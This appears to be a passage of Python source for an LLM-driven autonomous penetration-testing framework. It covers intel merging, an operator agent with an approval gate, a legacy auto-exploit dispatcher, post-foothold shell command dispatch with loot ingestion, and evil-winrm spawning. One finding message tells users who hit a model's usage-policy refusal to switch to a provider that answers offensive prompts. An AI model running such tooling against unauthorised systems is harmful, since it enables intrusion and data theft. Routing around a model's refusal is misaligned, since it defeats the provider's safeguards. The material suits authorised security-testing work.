                reasoning  = f"Phase '{phase}' subagent batch hit {timeout}s timeout — partial results retained",
                decision   = "Continuing with whatever intel was already merged",
                next_action= "Move to next phase",
            )
            return
        except Exception as exc:
            await self.emit_reasoning(
                step       = f"subagent_err_{phase}_batch",
                reasoning  = f"Subagent batch error (non-fatal): {exc}",
                decision   = "Continuing — main flow unaffected",
                next_action= "Next phase will see whatever was merged before failure",
            )
            return

        # Merge per-subagent results.  Each subagent typically returns either:
        #   - an AgentResult-like with .parsed_data dict
        #   - a plain dict (e.g. ExploitOrchestrator: {"shell_obtained": bool, ...})
        #   - None / Exception (skip)
        # We trust two intel-shaped key families:
        #   structured: open_ports, services (dict), os_guess, web_paths,
        #               technologies, users, shares, credentials,
        #               domain, dc_ip, interesting_files, banners
        #   list-type:  cves, vulnerabilities, exploits, web_vulns, login_pages
        STRUCTURED = {"open_ports", "services", "os_guess", "web_paths",
                      "technologies", "users", "shares", "credentials",
                      "domain", "dc_ip", "interesting_files", "banners",
                      "service_versions", "shells"}
        LIST_KEYS  = {"cves", "vulnerabilities", "exploits", "web_vulns",
                      "login_pages", "subdomains", "web_targets",
                      # Web subagents emit tool-specific finding lists in
                      # parsed_data; without these keys the merge SILENTLY DROPPED
                      # nikto/nuclei/dirb/whatweb discoveries, so they never
                      # reached intel/findings/the report (a confirmed cause of the
                      # near-empty findings page).  Additive — extends coverage only.
                      "nikto_findings", "nuclei_findings", "dirb_findings",
                      "whatweb_findings", "discovered_issues"}

        for res in results:
            if res is None or isinstance(res, Exception):
                continue
            pd = getattr(res, "parsed_data", None)
            if pd is None and isinstance(res, dict):
                pd = res
            if not isinstance(pd, dict):
                continue

            for k in STRUCTURED:
                if k not in pd or pd[k] is None:
                    continue
                v = pd[k]
                if k == "services" and isinstance(v, dict):
                    self._intel.setdefault("services", {}).update(v)
                elif k == "open_ports" and isinstance(v, list):
                    existing = self._intel.get("open_ports") or []
                    self._intel["open_ports"] = list(dict.fromkeys(list(existing) + list(v)))
                elif k in ("os_guess", "domain", "dc_ip"):
                    if v and self._intel.get(k, "") in ("", "unknown", None):
                        self._intel[k] = v
                elif isinstance(v, list):
                    existing = self._intel.get(k) or []
                    seen = {str(e) for e in existing}
                    for item in v:
                        if str(item) not in seen:
                            existing.append(item)
                            seen.add(str(item))
                    self._intel[k] = existing
                elif isinstance(v, dict):
                    self._intel.setdefault(k, {}).update(v)

            for k in LIST_KEYS:
                v = pd.get(k)
                if not isinstance(v, list):
                    continue
                existing = self._intel.get(k) or []
                seen = {str(e) for e in existing}
                for item in v:
                    if str(item) not in seen:
                        existing.append(item)
                        seen.add(str(item))
                self._intel[k] = existing

            # ExploitOrchestrator-shape: shell_obtained dict triggers
            # register_shell so downstream phases see the foothold.
            # Always call register_shell when shell_obtained=True — the
            # helper itself handles idempotence and privilege upgrades
            # (e.g. www-data → root).  Don't gate on existing
            # shell_access; that would prevent root-upgrade signals.
            if pd.get("shell_obtained"):
                try:
                    await self.register_shell(
                        source   = f"subagent:{phase}",
                        user     = pd.get("user") or "unknown",
                        host     = self._target,
                        method   = pd.get("method") or phase,
                        evidence = str(pd.get("evidence") or "")[:300],
                    )
                except Exception:
                    pass

    async def _guidance_drain_loop(self):
        """
        Background task: drain the guidance queue every 2 seconds independently
        of what the main scan coroutine is doing.

        This is the fix for guidance hanging the scan. Without this task, guidance
        only gets processed at explicit _apply_pending_guidance() checkpoints. If the
        main coroutine is blocked inside a long think() call or a slow DB write,
        those checkpoints never run and guidance sits in the queue indefinitely.

        By running this as a separate asyncio task, guidance is always processed
        within ~2 seconds of arrival regardless of LLM/DB latency.
        """
        while not self._stop_requested:
            try:
                # Drain ALL queued guidance items (not just one)
                while not self._guidance_queue.empty():
                    await self._apply_pending_guidance()
            except Exception:
                pass   # never crash the drain loop
            await asyncio.sleep(2.0)

    # ═══════════════════════════════════════════════════════════════
    #  PHASE 5 — REASONING ENGINE METHODS
    #  These methods are only called when use_reasoning_loop=True.
    #  They have zero effect on the existing code paths.
    # ═══════════════════════════════════════════════════════════════

    async def _init_reasoning_components(
        self,
        session_id: str,
        target:     str,
    ) -> None:
        """
        Instantiate all reasoning-engine components.
        Called once at the start of _execute_phases when the loop is enabled.
        Loads negative_memory from DB on session resume.
        """
        if not _REASONING_AVAILABLE:
            return

        # NegativeMemory — loads from DB to restore after pause/resume
        self._negative_memory = NegativeMemory(
            session_id  = session_id,
            db_store_fn = db.store_negative_memory,
            db_load_fn  = db.load_negative_memory,
        )
        await self._negative_memory.load_from_db()

        # Restore from intel snapshot if this is a resume
        stored_nm = self._intel.get("negative_memory", [])
        if stored_nm and len(self._negative_memory) == 0:
            for attempt_dict in stored_nm:
                from agents.reasoning.negative_memory import FailedAttempt
                attempt = FailedAttempt.from_dict(attempt_dict)
                self._negative_memory._attempts.append(attempt)
                key = f"{attempt.tool}:{attempt.target_service}"
                self._negative_memory._index[key] = attempt.attempt_count

        # HypothesisEngine — uses master's think_json and KB
        self._hypothesis_engine = HypothesisEngine(
            think_json_fn = self.think_json,
            kb_fn         = _kb_context,
            session_id    = session_id,
        )

        # AttackPlanner — uses master's think_json and KB
        self._attack_planner = AttackPlanner(
            think_json_fn = self.think_json,
            kb_fn         = _kb_context,
            session_id    = session_id,
        )
        # Restore ranked paths from checkpoint
        stored_paths = self._intel.get("ranked_attack_paths", [])
        if stored_paths:
            self._attack_planner.restore_from_dicts(stored_paths)

        # DecisionEngine — uses master's think_json and broadcast.
        # Pass the master's VoI ranker so candidate actions are scored by
        # expected information-value before one is chosen (Improvement #3).
        self._decision_engine = DecisionEngine(
            think_json_fn          = self.think_json,
            emit_fn                = self._broadcast_raw,
            session_id             = session_id,
            auto_execute_threshold = 0.70,
            voi_rank_fn            = self.rank_actions,
            tool_reliability_fn    = self._read_tool_reliability,
        )
        # Restore score from checkpoint
        self._decision_engine.set_score(self._intel.get("action_score", 0))

    def _read_tool_reliability(self) -> Dict[str, Dict[str, int]]:
        """Per-tool {success, fail} telemetry for the DecisionEngine read-side (Gap #7).
        Consumes the reliability signals ARGUS ALREADY tracks in-memory this engagement:
        ``_used_tools`` (attempts) and ``_tool_circuit_breaker`` (empty/blocked runs).
        Best-effort + read-only — returns {} on any problem so selection is unaffected."""
        try:
            used = getattr(self, "_used_tools", {}) or {}
            breaker = getattr(self, "_tool_circuit_breaker", {}) or {}
            fails: Dict[str, int] = {}
            for key, st in breaker.items():
                tool = key[0] if isinstance(key, (tuple, list)) and key else str(key)
                n = int((st or {}).get("consecutive_empty", 0) or 0)
                if (st or {}).get("blocked"):
                    n = max(n, 3)                     # a tripped breaker is a strong fail signal
                fails[tool] = fails.get(tool, 0) + n
            stats: Dict[str, Dict[str, int]] = {}
            for tool, attempts in used.items():
                try:
                    a = int(attempts)
                except (TypeError, ValueError):
                    continue
                f = min(a, fails.get(tool, 0))
                stats[tool] = {"success": max(0, a - f), "fail": f}
            for tool, f in fails.items():             # breaker-only tools (no run count)
                stats.setdefault(tool, {"success": 0, "fail": int(f)})
            return stats
        except Exception:
            return {}

    async def _note_operator_fallback(self, reason: str, detail: str) -> None:
        """Make an operator→legacy fallback VISIBLE on the findings page + feed.

        Without this, when the operator core can't start (e.g. its first
        reasoning call comes back empty), ARGUS silently runs the weaker legacy
        phase pipeline and the user is left wondering why 'the operator did
        nothing'.  Best-effort; never raises."""
        try:
            fn = getattr(self, "store_finding", None)
            if fn is None:
                return
            msg = (
                "The operator core could not start its reasoning loop "
                f"({reason}: {detail}). ARGUS ran the LEGACY phase pipeline "
                "instead — a weaker, less-targeted engagement that does NOT "
                "weaponize the CVE/PoC leads. Check the reasoning LLM: a primary "
                "policy refusal (claude-code Usage Policy) or a local model "
                "overflowing its context window are the usual causes. Set "
                "LLM_PROVIDER to a model that answers offensive-but-authorized "
                "prompts and/or raise OLLAMA_NUM_CTX, then re-run.")
            sev = "MEDIUM"
            try:
                from schemas import FindingSeverity as _FS
                sev = getattr(_FS, "MEDIUM", "MEDIUM")
            except Exception:
                pass
            await fn(severity=sev,
                     title="Operator core unavailable — legacy fallback engaged",
                     description=msg, host=getattr(self, "_target", "") or "",
                     tool_used="operator_core", cves=[], evidence=detail)
        except Exception:
            pass

    def _operator_core_enabled(self) -> bool:
        """Whether the persistent operator core drives this engagement.

        Default ON (the inversion: the operator agent drives; phases/subagents
        are its callable services).  Kill-switch: ARGUS_OPERATOR=0 (or off/false)
        forces the legacy ReasoningLoop.  Import-guarded so a broken/absent
        operator package degrades to legacy rather than crashing.
        """
        v = os.environ.get("ARGUS_OPERATOR", "1").strip().lower()
        if v in ("0", "off", "false", "no", "disabled"):
            return False
        try:
            import agents.operator_agent.operator_core  # noqa: F401
            return True
        except Exception:
            return False

    async def _reasoning_loop_run(
        self,
        session_id:  str,
        target:      str,
        plan:        Dict,
        resume_from: Optional[str] = None,
    ) -> None:
        """
        Run the engagement's reasoning driver.

        DEFAULT: the persistent operator core (agents.operator_agent) — a single
        long-lived ReAct agent that owns the engagement with an accumulating
        transcript + the full toolbelt.  The legacy hypothesis-driven
        ReasoningLoop is retained as an AUTOMATIC FALLBACK: if the operator LLM
        is unavailable (OperatorUnavailable) or the operator errors, the engine
        falls through to it.  Either way, final intel propagates to self._intel
        for reporting.
        """
        if not _REASONING_AVAILABLE:
            return

        loop = ReasoningLoop(
            master_agent       = self,
            session_id         = session_id,
            target             = target,
            intel              = self._intel,
            hypothesis_engine  = self._hypothesis_engine,
            decision_engine    = self._decision_engine,
            attack_planner     = self._attack_planner,
            negative_memory    = self._negative_memory,
            emit_fn            = self._broadcast_raw,
            check_pause_fn     = self._check_pause_requested,
            save_checkpoint_fn = self._save_reasoning_checkpoint,
        )
        self._reasoning_loop_inst = loop
        # Expose QuestionEngine on master for guidance-question routing
        self._question_engine = loop._question_engine

        # ── Start the reactive entry-attempt dispatcher IN PARALLEL ──────
        # The legacy dispatcher start (in _execute_phases) is bypassed by
        # the reasoning-loop early-return, so without this the instant-
        # reaction layer never ran in the DEFAULT engine.  Start it here so
        # the moment recon/vuln/OSINT identify an entry point — an open
        # service (pre-staged command), focused endpoint, harvested
        # credential, or ANY identified CVE — exploitation fires IMMEDIATELY
        # and IN PARALLEL with the reasoning loop's own iteration pivots,
        # rather than waiting for the next (slow) decision cycle.  The
        # dispatcher polls ctx.detect_entry_points() every 30s and also
        # wakes instantly on new-entry events.
        # When the operator core drives, it owns exploitation timing and honours
        # the approve-to-exploit gate — so the auto-fire reactive dispatcher must
        # NOT run alongside it (it would launch exploits without operator
        # consent).  Under the legacy loop (or operator fallback) it runs as before.
        use_operator = self._operator_core_enabled()

        _entry_task = None

        def _start_entry_dispatcher():
            nonlocal _entry_task
            if self._context is not None and _entry_task is None:
                try:
                    _entry_task = self._create_task(
                        self._entry_attempt_dispatcher(target)
                    )
                except Exception:
                    _entry_task = None

        if not use_operator:
            _start_entry_dispatcher()

        # ── Error Analyzer (DEFAULT-path startup) ─────────────────────────
        # Same bug class as the entry dispatcher: it was only started on the
        # legacy pipeline, so in the DEFAULT reasoning-loop engine it NEVER ran
        # — the platform looped on broken tools (curl "cannot execute binary
        # file", arjun timeouts, dalfox-not-found, …) with zero triage.  Start
        # + register it here so every tool error is LLM-classified in real time.
        _err_task = None
        try:
            from agents.meta.error_analyzer_agent import (
                ErrorAnalyzerAgent, register_analyzer)
            if getattr(self, "_error_analyzer", None) is None:
                try:
                    _ea_db = db.get_db()
                except Exception:
                    _ea_db = None
                self._error_analyzer = ErrorAnalyzerAgent(
                    broadcast=self.broadcast, session_id=session_id,
                    db_conn=_ea_db, enabled=True)
                register_analyzer(self._error_analyzer)
            _err_task = self._create_task(self._error_analyzer.run())
        except Exception as _eaerr:
            import logging as _l
            _l.getLogger(__name__).warning(
                "[error_analyzer] default-path start failed (non-fatal): %s", _eaerr)
            _err_task = None

        # ── Issue Validator — real finding GATE on the DEFAULT operator path ──
        # Construct + register + run alongside the Error Analyzer so the
        # write-time gate (base_agent.store_finding) can look it up by session,
        # and rejections broadcast live.  bind_master wires the
        # _pending_corrections bridge so the operator sees gated findings.
        try:
            from agents.meta.issue_validator_agent import (
                IssueValidatorAgent as _IVA, register_validator as _reg_iv)
            if getattr(self, "_issue_validator", None) is None and self._meta_agents_enabled:
                try:
                    _iv_db = db.get_db()
                except Exception:
                    _iv_db = None
                self._issue_validator = _IVA(
                    broadcast=self.broadcast, session_id=session_id, db_conn=_iv_db)
                self._issue_validator._session_id = session_id
                try:
                    self._issue_validator.bind_master(self)
                except Exception:
                    pass
            if getattr(self, "_issue_validator", None) is not None:
                _reg_iv(session_id, self._issue_validator)
                self._create_task(self._issue_validator.run())
        except Exception as _iverr:
            import logging as _l
            _l.getLogger(__name__).warning(
                "[issue_validator] default-path start failed (non-fatal): %s", _iverr)

        # Run the driver — operator core first, legacy ReasoningLoop as fallback.
        # One-time TRUTH banner: print what is ACTUALLY driving this engagement.
        # The per-call logs historically stamped a static MODEL_NAME constant (a
        # baked-in phantom default when nothing was configured) — this
        # resolves the live provider so the operator can SEE the real backend,
        # model, and backup instead of trusting a misleading model column.
        try:
            import logging as _ll
            from utils.llm_providers import (get_provider as _gp,
                                             get_fallback_provider as _gfp)
            _pp = _gp(); _fb = _gfp()
            _prim = f"{_pp.name}/{getattr(_pp, 'model', '') or '(no model set!)'}"
            if _fb is not None:
                _back = f"{_fb.name}/{getattr(_fb, 'model', '')}"
            elif _pp.name != "ollama":
                _back = "ollama (implicit local backup)"
            else:
                _back = "none"
            _ll.getLogger(__name__).info(
                "[llm] RESOLVED — primary=%s  backup=%s", _prim, _back)
            await self._emit("llm_resolved", {
                "session_id": session_id, "primary": _prim, "backup": _back})
        except Exception:
            pass

        try:
            final_intel = None
            if use_operator:
                try:
                    from agents.operator_agent.operator_core import (
                        OperatorCore, OperatorUnavailable)
                    autonomy = (getattr(self, "_operator_autonomy", "") or
                                os.environ.get("ARGUS_OPERATOR_AUTONOMY", "approve_to_exploit"))
                    _op_kwargs = dict(autonomy=autonomy,
                                      token_budget=getattr(self, "_token_budget_per_target", 0))
                    if getattr(self, "_operator_max_seconds", 0) > 0:
                        _op_kwargs["max_seconds"] = self._operator_max_seconds
                    op = OperatorCore(self, **_op_kwargs)
                    self._operator_core_inst = op
                    await self._emit("operator_core_start", {
                        "session_id": session_id, "target": target,
                        "autonomy": autonomy})
                    op_result = await op.run()
                    final_intel = self._intel   # operator mutates shared intel in place
                    await self._emit("operator_core_done", {
                        "session_id": session_id, "result": op_result})
                except OperatorUnavailable as _ou:
                    await self._emit("operator_core_fallback", {
                        "session_id": session_id, "reason": "llm_unavailable",
                        "detail": str(_ou)})
                    await self._note_operator_fallback("llm_unavailable", str(_ou))
                    final_intel = None
                except Exception as _oe:   # noqa: BLE001 — never crash the engine
                    import logging as _l
                    _l.getLogger(__name__).warning(
                        "[operator] core errored → legacy fallback: %s: %s",
                        type(_oe).__name__, _oe)
                    await self._emit("operator_core_fallback", {
                        "session_id": session_id, "reason": "error",
                        "detail": f"{type(_oe).__name__}: {_oe}"})
                    await self._note_operator_fallback("error", f"{type(_oe).__name__}: {_oe}")
                    final_intel = None

            if final_intel is None:
                # Legacy ReasoningLoop (operator disabled, unavailable, or errored).
                # Start the reactive dispatcher now if the operator pre-empted it.
                if use_operator:
                    _start_entry_dispatcher()
                final_intel = await loop.run()
        finally:
            # Stop the reactive dispatcher + error analyzer once the loop exits
            # (the dispatcher also self-terminates at post_exploit).
            if _entry_task is not None and not _entry_task.done():
                _entry_task.cancel()
            if _err_task is not None and not _err_task.done():
                try:
                    self._error_analyzer.request_stop()
                except Exception:
                    pass
                _err_task.cancel()

        # Merge final reasoning state back into self._intel
        for key in [
            "hypotheses", "negative_memory", "confidence_scores",
            "action_score", "failed_attempts", "ranked_attack_paths",
            "reasoning_journal",
        ]:
            if key in final_intel:
                self._intel[key] = final_intel[key]

        # After loop: run reporting phase
        await self._emit("phase_update", {
            "phase":  "reporting",
            "status": "active",
            "label":  "Report Generation",
        })

    # ── Tool-to-phase classification tables ──────────────────────────────────
    _RECON_TOOLS: frozenset = frozenset({
        "nmap", "masscan", "rustscan", "whatweb", "wkhtmltoimage",
        "dnsrecon", "dnsx", "subfinder", "amass", "dig", "host",
        "ping", "traceroute", "whois", "wafw00f", "testssl", "sslscan",
        "enum4linux", "enum4linux-ng", "smbclient", "rpcclient", "smbmap",
        "nbtscan", "snmpwalk", "snmpcheck", "onesixtyone", "ldapsearch",
    })
    _WEB_TOOLS: frozenset = frozenset({
        "sqlmap", "nuclei", "wfuzz", "feroxbuster", "gobuster", "dirsearch",
        "ffuf", "nikto", "xsstrike", "dalfox", "arjun", "jwt_tool",
        "wapiti", "zap", "zaproxy", "commix", "burpsuite", "dirb", "wpscan",
        "droopescan", "joomscan", "cmseek",
    })
    _VULN_TOOLS: frozenset = frozenset({
        "openvas", "gvm-cli", "gvm-start", "openvas-scanner",
        "openvas-nasl", "nessus", "vulners", "vulscan",
        "smtp-user-enum", "finger", "ident-user-enum",
    })
    _EXPLOIT_TOOLS: frozenset = frozenset({
        "msfconsole", "msfvenom", "metasploit", "searchsploit",
        "hydra", "medusa", "ncrack", "patator",
        "crackmapexec", "cme", "evil-winrm", "impacket",
        "responder", "john", "hashcat",
    })
    _PRIVESC_TOOLS: frozenset = frozenset({
        "linpeas", "winpeas", "pspy", "linenum", "les", "lse", "les2",
        "suid3num", "sudo_killer", "deepce", "wesng", "powerup",
        "sherlock", "beroot", "privesccheck",
    })
    def _classify_tool_to_phase(self, tool: str) -> str:
        """Map a tool name to the phase agent that should execute it."""
        tl = tool.lower().split()[0]      # normalise: strip args if present
        if tl in self._RECON_TOOLS:        return "recon"
        if tl in self._WEB_TOOLS:          return "web"
        if tl in self._EXPLOIT_TOOLS:      return "exploit"
        if tl in self._PRIVESC_TOOLS:      return "privesc"
        if tl in self._VULN_TOOLS:         return "vuln"
        # Heuristic fallbacks
        if any(k in tl for k in ("scan", "map", "enum", "recon", "dns", "whois")):
            return "recon"
        if any(k in tl for k in ("fuzz", "brute", "spider", "crawl", "web", "http")):
            return "web"
        if any(k in tl for k in ("exploit", "payload", "shell", "msf", "msfconsole")):
            return "exploit"
        if any(k in tl for k in ("priv", "esc", "peas", "enum_linux")):
            return "privesc"
        return "generic"

    # Tools every primer chain depends on.  When one of these is missing
    # from the operator's Kali, the corresponding chain step silently
    # skips itself — _probe_primer_tool_availability surfaces the gap
    # at session start so the operator knows up-front.
    _PRIMER_TOOL_DEPS: Dict[str, List[str]] = {
        "credentialed-AD":     ["crackmapexec", "evil-winrm", "impacket-GetUserSPNs",
                                 "impacket-GetNPUsers", "impacket-secretsdump",
                                 "ldapsearch", "bloodhound-python", "xfreerdp"],
        "credentialed-DB":     ["mysql", "psql", "impacket-mssqlclient",
                                 "mongosh", "redis-cli"],
        "credentialed-SSH":    ["sshpass", "ssh"],
        "credentialed-Web":    ["curl", "swaks"],
        "no-creds-AD":         ["ldapsearch", "impacket-lookupsid", "enum4linux-ng",
                                 "crackmapexec", "kerbrute", "coercer", "responder"],
        "default-creds":       ["hydra", "crackmapexec", "redis-cli", "mongosh",
                                 "snmpwalk"],
        "web-exploit":         ["whatweb", "nuclei", "feroxbuster", "wpscan",
                                 "droopescan", "joomscan", "arjun", "sqlmap",
                                 "tplmap", "ffuf", "dalfox", "davtest"],
        "post-foothold":       ["curl", "wget"],   # plus shell_exec (no MCP probe)
        "lateral":             ["nmap", "crackmapexec", "impacket-getST",
                                 "impacket-secretsdump"],
    }

    async def _probe_primer_tool_availability(self, session_id: str) -> None:
        """Probe MCP for every tool referenced by the primer chains.
        Emit a `primer_tool_availability` event with per-chain coverage
        stats so the dashboard can surface gaps and the operator can
        take corrective action (apt install / disable chain) up-front.
        """
        import httpx, os as _os
        mcp_url = _os.environ.get("MCP_URL", "http://localhost:3000")

        # Flatten and dedupe the dep set so we issue one probe per tool
        all_tools = sorted({t for deps in self._PRIMER_TOOL_DEPS.values() for t in deps})

        # B4 — record per-tool probe outcome so missing/probe-failed tools
        # can be told apart in scan.log.  Without this, a probe error
        # (timeout, MCP 5xx, JSON parse fail) is indistinguishable from
        # "tool not on PATH".
        availability: Dict[str, bool] = {}
        probe_errors: Dict[str, str]  = {}
        import logging as _l
        _log = _l.getLogger(__name__)
        try:
            async with httpx.AsyncClient(timeout=2.0) as client:
                for tool_name in all_tools:
                    try:
                        resp = await client.post(mcp_url + "/", json={
                            "method": "tools/check",
                            "params": {"name": tool_name},
                        })
                        if resp.status_code == 200:
                            try:
                                body = resp.json() or {}
                            except Exception as je:
                                probe_errors[tool_name] = f"json_parse: {je!s:.80}"
                                availability[tool_name] = False
                                _log.debug(
                                    "[primer-deps] PROBE_FAIL tool=%s reason=json_parse",
                                    tool_name,
                                )
                                continue
                            present = bool(
                                body.get("available")
                                or body.get("ok")
                                or body.get("result", {}).get("available")
                            )
                            availability[tool_name] = present
                            if not present:
                                # Record why MCP says not-available
                                reason = (
                                    body.get("reason")
                                    or body.get("result", {}).get("reason")
                                    or "not_in_registry_or_PATH"
                                )
                                probe_errors[tool_name] = str(reason)[:120]
                        else:
                            availability[tool_name] = False
                            probe_errors[tool_name] = f"http_{resp.status_code}"
                            _log.warning(
                                "[primer-deps] PROBE_FAIL tool=%s http=%d",
                                tool_name, resp.status_code,
                            )
                    except Exception as exc:
                        availability[tool_name] = False
                        probe_errors[tool_name] = f"{type(exc).__name__}: {exc!s:.80}"
                        _log.warning(
                            "[primer-deps] PROBE_ERR tool=%s err=%s",
                            tool_name, type(exc).__name__,
                        )
        except Exception as exc:
            # MCP unreachable — mark all tools "unknown" rather than block startup
            _log.error(
                "[primer-deps] MCP unreachable at %s (%s) — entire probe pass skipped",
                mcp_url, exc,
            )
            availability = {t: None for t in all_tools}
            probe_errors = {t: f"mcp_unreachable:{type(exc).__name__}" for t in all_tools}

        # Per-chain coverage
        chain_coverage: Dict[str, Dict[str, Any]] = {}
        for chain_name, deps in self._PRIMER_TOOL_DEPS.items():
            present = [t for t in deps if availability.get(t) is True]
            missing = [t for t in deps if availability.get(t) is False]
            chain_coverage[chain_name] = {
                "deps":     deps,
                "present":  present,
                "missing":  missing,
                "coverage": (len(present) / len(deps)) if deps else 1.0,
            }

        missing_overall = sorted({m for c in chain_coverage.values() for m in c["missing"]})
        install_hints = {
            t: f"apt install -y {t}"
            for t in missing_overall
            # Best-effort hints — pip / nodejs / go-installed tools won't apt-install.
            # Operator still gets the tool name and can install via the right path.
        }

        try:
            await self._broadcast_raw({
                "type":       "primer_tool_availability",
                "session_id": session_id,
                "agent":      "master",
                "data": {
                    "tools_total":     len(all_tools),
                    "tools_present":   sum(1 for v in availability.values() if v is True),
                    "tools_missing":   missing_overall,
                    "install_hints":   install_hints,
                    "chain_coverage":  chain_coverage,
                    "probe_errors":    probe_errors,   # B4 — per-tool failure detail
                },
            })
        except Exception:
            pass

        # Also emit a one-line console summary for log-tailing operators
        try:
            import logging as _l
            log = _l.getLogger(__name__)
            for chain_name, info in chain_coverage.items():
                if info["missing"]:
                    log.warning(
                        "[primer-deps] %-18s coverage=%d/%d  MISSING: %s",
                        chain_name,
                        len(info["present"]), len(info["deps"]),
                        ", ".join(info["missing"]),
                    )
                else:
                    log.info(
                        "[primer-deps] %-18s coverage=%d/%d  (all present)",
                        chain_name, len(info["present"]), len(info["deps"]),
                    )
        except Exception:
            pass

        # Stash on intel so the LLM planner can see what's available
        self._intel["primer_tool_availability"] = chain_coverage

    async def _dispatch_active_shell_command(
        self,
        *, command: str,
        purpose:    str = "",
        timeout:    int = 60,
    ) -> dict:
        """Run ``command`` inside the most-recent confirmed shell session
        and capture its output.

        Used by the post-foothold + lateral primers, which emit synthetic
        ``shell_exec`` actions instead of MCP-dispatched tool calls.
        Returns the standard dispatch shape so callers don't need to
        special-case it: ``{stdout, stderr, exit_code, tool, args}``.

        Output capture works by:
          * resolving the most recent non-pending shell from intel['shells']
          * registering a temporary listener on the ShellAgent's broadcast
            so we can buffer chunks of output during the window
          * pushing the command + a unique sentinel string to the PTY
          * collecting output until the sentinel echoes back (or until
            ``timeout`` elapses)

        When no shell session exists, returns an explanatory failure
        result rather than spawning a fresh subprocess.
        """
        import asyncio as _asyncio
        import time as _time
        import uuid as _uuid

        # Find the active shell to dispatch through
        shells = self._intel.get("shells") or []
        active = [s for s in shells if isinstance(s, dict) and not s.get("pending")]
        if not active:
            return {
                "stdout":    "",
                "stderr":    "no active shell session — primer should not have fired",
                "exit_code": -2,
                "output_id": "",
                "tool":      "shell_exec",
                "args":      command,
            }
        shell_record = active[-1]
        shell_id     = shell_record.get("session_id") or shell_record.get("shell_id") or ""

        shell_agent = getattr(self, "_shell_agent", None)
        if shell_agent is None:
            try:
                from agents.shell_agent import ShellAgent
                shell_agent = ShellAgent(broadcast=self.broadcast)
                shell_agent._session_id = self._session_id
                shell_agent._master = self
                self._shell_agent = shell_agent
            except Exception as exc:
                return {
                    "stdout":    "",
                    "stderr":    f"shell agent unavailable: {exc}",
                    "exit_code": -3,
                    "tool":      "shell_exec",
                    "args":      command,
                }

        # Sentinel + buffer setup
        sentinel = f"__ARGUS_DONE_{_uuid.uuid4().hex[:12]}__"
        chunks: list = []

        # Tap the ShellAgent's per-shell PTY output for our session.
        # ShellAgent broadcasts shell_output messages; we hook the
        # shell_agent._on_pty_output to also feed our buffer.
        original_on_output = getattr(shell_agent, "_on_pty_output", None)

        async def _tap(_shell_id, _data):
            if _shell_id == shell_id:
                chunks.append(_data)
            try:
                if callable(original_on_output):
                    await original_on_output(_shell_id, _data)
            except Exception:
                pass

        # Find the actual PtyShell record so we can override the callback
        pty = (shell_agent._shells or {}).get(shell_id) if hasattr(shell_agent, "_shells") else None
        if pty is None:
            return {
                "stdout":    "",
                "stderr":    f"shell session {shell_id} not registered in ShellAgent — primer fired before shell wire-up completed",
                "exit_code": -4,
                "tool":      "shell_exec",
                "args":      command,
            }
        original_callback = pty.on_output
        pty.on_output = _tap

        # Build the wrapped command — append `; echo SENTINEL`.  We use a
        # newline so even multi-stage shells get the right boundary.
        wrapped = (command or "").rstrip()
        # Avoid breaking PowerShell pipelines — use `; ` for cmd/PS and
        # `\n` for bash; both shells accept the bash form harmlessly.
        wrapped = wrapped + f"\necho {sentinel}\n"

        # Operator visibility: surface the command ARGUS is about to run in the
        # shared session so the human sees ARGUS's post-exploitation activity in
        # the event feed (the live stdout already streams to their terminal via
        # the shared ShellAgent's shell_output broadcast).
        try:
            await self._emit("agent_shell_command", {
                "session_id": self._session_id,
                "shell_id":   shell_id,
                "command":    command,
                "purpose":    purpose,
                "actor":      "argus",
            })
        except Exception:
            pass

        try:
            # Send the command into the PTY
            await shell_agent.handle_input(shell_id, wrapped)

            # Wait for sentinel or timeout
            deadline = _time.monotonic() + max(5, int(timeout or 60))
            while _time.monotonic() < deadline:
                blob = "".join(chunks)
                if sentinel in blob:
                    # Strip the wrapper artefacts: the echo'd command and
                    # everything from the sentinel onward.
                    idx = blob.find(sentinel)
                    captured = blob[:idx]
                    # Best-effort: strip the leading echo of the command itself
                    cmd_first_line = (command or "").splitlines()[0] if command else ""
                    if cmd_first_line and captured.lstrip().startswith(cmd_first_line):
                        captured = captured.lstrip()[len(cmd_first_line):]
                    captured_clean = captured.strip()
                    # Feed captured output to the exfil pipeline for DoI
                    # classification — this is how post-foothold loot
                    # ends up in intel['loot'] for the lateral primer.
                    try:
                        self.ingest_loot(
                            captured_clean,
                            source = f"shell:{shell_id}",
                            tool   = "shell_exec",
                            host   = shell_record.get("host"),
                        )
                    except Exception:
                        pass
                    return {
                        "stdout":    captured_clean,
                        "stderr":    "",
                        "exit_code": 0,
                        "tool":      "shell_exec",
                        "args":      command,
                        "shell_id":  shell_id,
                    }
                await _asyncio.sleep(0.5)

            # Timeout — return whatever we got so the loop can still learn from it
            return {
                "stdout":    "".join(chunks),
                "stderr":    f"shell_exec timeout after {timeout}s (no sentinel)",
                "exit_code": 124,
                "tool":      "shell_exec",
                "args":      command,
                "shell_id":  shell_id,
            }
        finally:
            try:
                pty.on_output = original_callback
            except Exception:
                pass

    async def _dispatch_evil_winrm(
        self,
        *, args:   str,
        purpose:   str = "",
        timeout:   int = 60,
    ) -> dict:
        """B11 — Spawn evil-winrm as a PTY-backed shell session and capture
        the prompt as a confirmed foothold.

        evil-winrm is fundamentally interactive — when MCP runs it as a
        regular tool the process hangs at the ``*Evil-WinRM* PS C:\\>``
        prompt waiting for input, hits the read timeout, and gets killed.
        Result: the credentialed-AD primer's "instant shell" step
        produced no shell, no foothold, no register_shell call.

        Here we route the spawn through ShellAgent.create_listener-style
        PTY infrastructure: the prompt streams back through the PTY,
        we wait for the recognisable banner, then call register_shell
        with confirmed=True so post-exploitation actually fires.

        ``args`` should be the standard evil-winrm flags (e.g.
        ``-i 10.0.0.1 -u user -p 'pass'``).
        """
        import asyncio as _asyncio
        import re as _re
        import time as _time
        import uuid as _uuid

        shell_id = f"ewinrm-{_uuid.uuid4().hex[:8]}"

        # Lazily build / reuse a ShellAgent
        shell_agent = getattr(self, "_shell_agent", None)
        if shell_agent is None:
            try:
                from agents.shell_agent import ShellAgent, PtyShell
            except Exception as exc:
                return {
                    "stdout":    "",
                    "stderr":    f"shell_agent import failed: {exc}",
                    "exit_code": -3,
                    "tool":      "evil-winrm",
                    "args":      args,
                }
            shell_agent = ShellAgent(broadcast=self.broadcast)
            shell_agent._session_id = self._session_id
            shell_agent._master = self
            self._shell_agent = shell_agent
        else:
            try:
                from agents.shell_agent import PtyShell
            except Exception:
                from agents.shell_agent import PtyShell  # type: ignore

        # Parse out target / user from args so we can populate intel
        # and pass them to register_shell when the prompt lands.
        m_target = _re.search(r"-i\s+(\S+)", args or "")
        m_user   = _re.search(r"-u\s+(\S+)", args or "")
